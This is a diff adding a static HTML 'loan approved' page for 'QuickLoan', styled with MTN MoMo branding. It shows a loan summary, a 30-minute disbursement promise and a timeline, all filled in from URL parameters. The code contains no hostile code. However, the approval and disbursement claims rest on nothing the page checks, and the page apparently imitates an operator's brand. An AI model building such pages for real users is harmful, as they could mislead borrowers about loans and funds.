@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Approved — QuickLoan</title>
+<style>
+  :root{
+    --mtn-blue:#004F9F;
+    --mtn-blue-dark:#003B77;
+    --mtn-blue-light:#1A6DC4;
+    --mtn-yellow:#FFCC00;
+    --bg:#F7F9FC;
+    --card:#FFFFFF;
+    --text:#0A1B33;
+    --muted:#64748B;
+    --border:#E2E8F0;
+    --green:#00A651;
+    --green-soft:#E6F7ED;
+    --green-border:#C6EBD5;
+    --amber:#D97706;
+    --amber-soft:#FEF3C7;
+    --amber-border:#FCD34D;
+  }
+
+  *{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
+  }
+
+  html,body{height:100%;}
+
+  body{
+    background:var(--bg);
+    color:var(--text);
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+
+  /* ============ BLUE FRAME LINES ============ */
+  .frame-top, .frame-bottom{
+    width:100%;
+    height:6px;
+    background:linear-gradient(90deg, var(--mtn-blue) 0%, var(--mtn-blue-light) 50%, var(--mtn-blue) 100%);
+  }
+  .frame-bottom{margin-top:auto;}
+
+  /* ============ HEADER ============ */
+  .header{
+    width:100%;
+    background:#FFFFFF;
+    border-bottom:1px solid var(--border);
+    padding:16px 20px;
+    position:sticky;top:0;z-index:50;
+    box-shadow:0 2px 12px rgba(0,79,159,0.06);
+  }
+  .header-inner{
+    width:100%;max-width:920px;margin:0 auto;
+    display:flex;align-items:center;justify-content:space-between;
+  }
+
+  .brand{display:flex;align-items:center;gap:11px;text-decoration:none;}
+  .brand .logo{
+    width:42px;height:42px;border-radius:50%;
+    background:var(--mtn-blue);
+    display:flex;align-items:center;justify-content:center;
+    font-weight:900;color:var(--mtn-yellow);
+    font-size:11.5px;letter-spacing:-0.4px;
+    box-shadow:0 4px 12px rgba(0,79,159,0.28);
+  }
+  .brand .wordmark{display:flex;flex-direction:column;line-height:1.15;}
+  .brand .wordmark strong{
+    font-size:17px;font-weight:800;color:var(--mtn-blue);letter-spacing:-0.3px;
+  }
+  .brand .wordmark small{
+    font-size:10.5px;color:var(--muted);font-weight:600;
+    letter-spacing:0.4px;text-transform:uppercase;
+  }
+
+  /* ---- STEP INDICATOR (all done) ---- */
+  .steps{display:flex;align-items:center;gap:8px;}
+  .step{
+    display:flex;align-items:center;gap:7px;
+    font-size:12.5px;font-weight:700;color:var(--green);
+  }
+  .step .num{
+    width:24px;height:24px;border-radius:50%;
+    background:var(--green);color:#FFFFFF;
+    display:flex;align-items:center;justify-content:center;
+    font-size:12px;font-weight:800;
+  }
+  .step-line{width:16px;height:2px;background:var(--green);border-radius:2px;}
+
+  /* ============ MAIN ============ */
+  main{
+    width:100%;max-width:920px;flex:1;
+    padding:40px 20px 60px;
+    display:flex;flex-direction:column;align-items:center;
+  }
+
+  /* ---- SUCCESS HERO ---- */
+  .hero{
+    text-align:center;
+    margin-bottom:30px;
+    max-width:560px;
+  }
+
+  .check-circle{
+    width:88px;height:88px;border-radius:50%;
+    background:var(--green-soft);
+    display:flex;align-items:center;justify-content:center;
+    margin:0 auto 22px;
+    position:relative;
+    animation:pop .5s cubic-bezier(.2,.9,.3,1.2);
+  }
+  .check-circle::after{
+    content:"";
+    position:absolute;inset:-8px;border-radius:50%;
+    border:2px solid var(--green);
+    opacity:0.25;
+    animation:pulse 2s ease-in-out infinite;
+  }
+  .check-circle svg{
+    width:42px;height:42px;
+    stroke:var(--green);fill:none;
+    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
+    stroke-dasharray:50;
+    stroke-dashoffset:50;
+    animation:draw .6s .25s ease forwards;
+  }
+  @keyframes pop{0%{transform:scale(0.5);opacity:0;}100%{transform:scale(1);opacity:1;}}
+  @keyframes draw{to{stroke-dashoffset:0;}}
+  @keyframes pulse{0%,100%{transform:scale(1);opacity:0.25;}50%{transform:scale(1.12);opacity:0.08;}}
+
+  .hero h1{
+    font-size:30px;font-weight:800;letter-spacing:-0.7px;
+    color:var(--text);margin-bottom:10px;
+  }
+  .hero h1 em{font-style:normal;color:var(--green);}
+  .hero p{font-size:15px;color:var(--muted);line-height:1.6;}
+
+  .ref{
+    display:inline-flex;align-items:center;gap:8px;
+    background:#EAF2FB;border:1px solid #D3E0F0;
+    color:var(--mtn-blue);
+    font-size:12.5px;font-weight:700;
+    padding:8px 16px;border-radius:999px;
+    margin-top:16px;letter-spacing:0.4px;
+  }
+  .ref span{font-family:'Courier New',monospace;font-weight:800;}
+
+  /* ============ DISBURSEMENT BANNER ============ */
+  .banner{
+    width:100%;max-width:480px;
+    background:linear-gradient(135deg, #E6F7ED 0%, #D1F0DF 100%);
+    border:1px solid var(--green-border);
+    border-radius:16px;
+    padding:20px 22px;
+    display:flex;align-items:center;gap:14px;
+    margin-bottom:20px;
+    box-shadow:0 8px 24px rgba(0,166,81,0.10);
+  }
+  .banner .clock{
+    width:46px;height:46px;border-radius:50%;
+    background:#FFFFFF;
+    display:flex;align-items:center;justify-content:center;flex-shrink:0;
+    box-shadow:0 2px 8px rgba(0,166,81,0.15);
+  }
+  .banner .clock svg{
+    width:24px;height:24px;
+    stroke:var(--green);fill:none;
+    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
+  }
+  .banner .text strong{
+    display:block;font-size:14px;font-weight:800;color:#0F5132;margin-bottom:3px;
+  }
+  .banner .text small{
+    font-size:12.5px;color:#3D7A5C;font-weight:600;line-height:1.5;
+  }
+
+  /* ============ CARD ============ */
+  .card{
+    background:var(--card);
+    width:100%;max-width:480px;
+    border-radius:20px;
+    padding:0;
+    box-shadow:0 12px 40px rgba(0,79,159,0.10);
+    border:1px solid var(--border);
+    border-top:4px solid var(--mtn-blue);
+    overflow:hidden;
+    margin-bottom:20px;
+  }
+  .card-body{padding:28px 28px 30px;}
+
+  .section-title{
+    font-size:11.5px;font-weight:800;
+    color:var(--muted);letter-spacing:0.9px;
+    text-transform:uppercase;margin-bottom:14px;
+  }
+
+  .row{
+    display:flex;justify-content:space-between;
+    font-size:13.5px;padding:10px 0;color:var(--text);
+  }
+  .row + .row{border-top:1px dashed #E2E8F0;}
+  .row span:first-child{color:var(--muted);font-weight:600;}
+  .row span:last-child{font-weight:700;}
+
+  .row.total{
+    padding-top:14px;
+    border-top:2px solid var(--mtn-blue) !important;
+    margin-top:4px;
+  }
+  .row.total span:first-child{
+    color:var(--mtn-blue);font-weight:800;font-size:14px;align-self:center;
+  }
+  .row.total span:last-child{
+    color:var(--mtn-blue);font-size:21px;font-weight:900;letter-spacing:-0.5px;
+  }
+
+  /* ---- WALLET ROW ---- */
+  .wallet-row{
+    background:#F5F8FC;
+    border-top:1px solid #E2E8F0;
+    border-bottom:1px solid #E2E8F0;
+    padding:16px 28px;
+    display:flex;align-items:center;gap:12px;
+  }
+  .wallet-row .icon{
+    width:38px;height:38px;border-radius:50%;
+    background:var(--mtn-blue);
+    display:flex;align-items:center;justify-content:center;flex-shrink:0;
+  }
+  .wallet-row .icon svg{
+    width:19px;height:19px;stroke:#FFFFFF;fill:none;
+    stroke-width:2.3;stroke-linecap:round;stroke-linejoin:round;
+  }
+  .wallet-row .text strong{
+    display:block;font-size:13.5px;font-weight:800;color:var(--text);margin-bottom:2px;
+  }
+  .wallet-row .text small{
+    font-size:12px;color:var(--muted);font-weight:600;
+  }
+
+  /* ============ TIMELINE ============ */
+  .timeline{
+    width:100%;max-width:480px;
+    background:var(--card);
+    border-radius:20px;
+    padding:26px 28px 28px;
+    box-shadow:0 12px 40px rgba(0,79,159,0.10);
+    border:1px solid var(--border);
+    margin-bottom:20px;
+  }
+  .timeline .section-title{margin-bottom:18px;}
+
+  .tl-item{
+    display:flex;
+    gap:14px;
+    padding-bottom:18px;
+    position:relative;
+  }
+  .tl-item:last-child{padding-bottom:0;}
+  .tl-item::before{
+    content:"";
+    position:absolute;
+    left:13px;top:30px;bottom:0;
+    width:2px;
+    background:#E8EEF6;
+  }
+  .tl-item:last-child::before{display:none;}
+  .tl-item.done::before{background:var(--green);}
+
+  .tl-dot{
+    width:28px;height:28px;border-radius:50%;
+    background:#E8EEF6;
+    display:flex;align-items:center;justify-content:center;
+    flex-shrink:0;
+    z-index:1;
+  }
+  .tl-dot svg{
+    width:14px;height:14px;
+    stroke:#A9B6C7;fill:none;
+    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
+  }
+  .tl-item.done .tl-dot{background:var(--green);}
+  .tl-item.done .tl-dot svg{stroke:#FFFFFF;}
+  .tl-item.active .tl-dot{background:var(--green);}
+  .tl-item.active .tl-dot svg{stroke:#FFFFFF;}
+
+  .tl-body{flex:1;padding-top:2px;}
+  .tl-body strong{
+    display:block;font-size:13.5px;font-weight:800;color:var(--text);margin-bottom:3px;
+  }
+  .tl-item.pending .tl-body strong{color:#A9B6C7;}
+  .tl-body small{
+    font-size:11.5px;color:var(--muted);font-weight:600;line-height:1.5;
+  }
+  .tl-item.active .tl-body small{color:var(--green);font-weight:700;}
+
+  /* ============ ACTIONS ============ */
+  .actions{
+    width:100%;max-width:480px;
+    display:flex;gap:12px;margin-top:6px;
+  }
+  .btn-primary{
+    flex:1;
+    padding:16px;
+    border:none;border-radius:12px;
+    background:var(--mtn-blue);
+    color:#FFFFFF;
+    font-size:15px;font-weight:800;
+    cursor:pointer;text-decoration:none;
+    display:flex;align-items:center;justify-content:center;
+    letter-spacing:0.3px;
+    transition:.18s;
+    box-shadow:0 8px 20px rgba(0,79,159,0.3);
+  }
+  .btn-primary:hover{
+    background:var(--mtn-blue-dark);
+    transform:translateY(-2px);
+    box-shadow:0 12px 26px rgba(0,79,159,0.38);
+  }
+  .btn-primary:active{transform:translateY(0);}
+
+  .note{
+    font-size:11.5px;color:var(--muted);
+    text-align:center;margin-top:20px;
+    line-height:1.65;max-width:480px;font-weight:500;
+  }
+  .note strong{color:var(--mtn-blue);}
+
+  /* ============ MOBILE ============ */
+  @media(max-width:640px){
+    .steps .step span:not(.num){display:none;}
+    .step-line{width:10px;}
+    .hero h1{font-size:24px;}
+    main{padding:28px 16px 44px;}
+    .card-body{padding:24px 20px;}
+    .timeline{padding:22px 20px;}
+    .wallet-row{padding:16px 20px;}
+    .banner{padding:18px;}
+    .brand .wordmark small{display:none;}
+  }
+</style>
+</head>
+<body>
+
+  <div class="frame-top"></div>
+
+  <header class="header">
+    <div class="header-inner">
+      <a class="brand" href="index.html">
+        <div class="logo">MTN</div>
+        <div class="wordmark">
+          <strong>QuickLoan</strong>
+          <small>Powered by MoMo</small>
+        </div>
+      </a>
+
+      <div class="steps">
+        <div class="step"><span class="num">✓</span><span>Amount</span></div>
+        <div class="step-line"></div>
+        <div class="step"><span class="num">✓</span><span>Details</span></div>
+        <div class="step-line"></div>
+        <div class="step"><span class="num">✓</span><span>Verify</span></div>
+        <div class="step-line"></div>
+        <div class="step"><span class="num">✓</span><span>Approved</span></div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+
+    <!-- SUCCESS HERO -->
+    <section class="hero">
+      <div class="check-circle">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <h1>Loan <em>approved</em></h1>
+      <p>Your loan has been approved and is being prepared for disbursement to your MoMo wallet.</p>
+      <div class="ref">Reference <span id="refCode">QL-000000</span></div>
+    </section>
+
+    <!-- DISBURSEMENT BANNER -->
+    <div class="banner">
+      <div class="clock">
+        <svg viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="10"/>
+          <polyline points="12 6 12 12 16 14"/>
+        </svg>
+      </div>
+      <div class="text">
+        <strong>Disbursement within 30 minutes</strong>
+        <small>You'll receive an SMS on your MoMo wallet as soon as funds are released.</small>
+      </div>
+    </div>
+
+    <!-- LOAN SUMMARY -->
+    <div class="card">
+      <div class="card-body">
+        <div class="section-title">Loan summary</div>
+        <div class="row"><span>Loan principal</span><span id="sPrincipal">50,000 XAF</span></div>
+        <div class="row"><span>Interest (5%)</span><span id="sInterest">2,500 XAF</span></div>
+        <div class="row"><span>Repayment period</span><span id="sPeriod">1 month</span></div>
+        <div class="row total"><span>Total repayment</span><span id="sTotal">52,500 XAF</span></div>
+      </div>
+
+      <div class="wallet-row">
+        <div class="icon">
+          <svg viewBox="0 0 24 24">
+            <rect x="2" y="6" width="20" height="14" rx="3"/>
+            <path d="M2 10h20"/>
+          </svg>
+        </div>
+        <div class="text">
+          <strong id="disbPhone">+237 6XX XXX XXX</strong>
+          <small>Funds will be sent to this MoMo wallet</small>
+        </div>
+      </div>
+    </div>
+
+    <!-- TIMELINE -->
+    <div class="timeline">
+      <div class="section-title">What happens next</div>
+
+      <div class="tl-item done">
+        <div class="tl-dot">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="tl-body">
+          <strong>Application received</strong>
+          <small>Your request was successfully submitted.</small>
+        </div>
+      </div>
+
+      <div class="tl-item done">
+        <div class="tl-dot">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="tl-body">
+          <strong>Loan approved</strong>
+          <small>Your application has been reviewed and approved.</small>
+        </div>
+      </div>
+
+      <div class="tl-item active">
+        <div class="tl-dot">
+          <svg viewBox="0 0 24 24">
+            <line x1="12" y1="19" x2="12" y2="5"/>
+            <polyline points="5 12 12 5 19 12"/>
+          </svg>
+        </div>
+        <div class="tl-body">
+          <strong>Disbursement in progress</strong>
+          <small>Funds will reach your MoMo wallet within 30 minutes.</small>
+        </div>
+      </div>
+
+      <div class="tl-item pending">
+        <div class="tl-dot">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="tl-body">
+          <strong>Repayment starts</strong>
+          <small>Automatic debit from your MoMo wallet on each due date.</small>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- ACTIONS -->
+    <div class="actions">
+      <a href="index.html" class="btn-primary">Back to home</a>
+    </div>
+
+    <p class="note">
+      Need help? Contact <strong>MTN MoMo support</strong> with your reference number.
+      You'll be notified by SMS at every step.
+    </p>
+
+  </main>
+
+  <div class="frame-bottom"></div>
+
+<script>
+  // ----- CONFIG -----
+  const CONFIG = { interestRate: 0.05 };
+
+  // ----- READ FROM URL -----
+  const params = new URLSearchParams(location.search);
+  const amount = parseInt(params.get('amount')) || 50000;
+  const months = parseInt(params.get('months')) || 1;
+  const phone  = params.get('phone')  || '+237 6XX XXX XXX';
+  const ref    = params.get('ref')    || generateRef();
+
+  const fmt = n => Math.round(n).toLocaleString('fr-FR') + ' XAF';
+
+  function generateRef(){
+    return 'QL-' + Math.floor(100000 + Math.random() * 900000);
+  }
+
+  // ----- CALC -----
+  const interest = amount * CONFIG.interestRate;
+  const total    = amount + interest;
+
+  // ----- FILL SUMMARY -----
+  document.getElementById('refCode').textContent    = ref;
+  document.getElementById('sPrincipal').textContent = fmt(amount);
+  document.getElementById('sInterest').textContent  = fmt(interest);
+  document.getElementById('sPeriod').textContent    =
+    months + (months === 1 ? ' month' : ' months');
+  document.getElementById('sTotal').textContent     = fmt(total);
+  document.getElementById('disbPhone').textContent  = phone;
+</script>
+</body>
+</html>
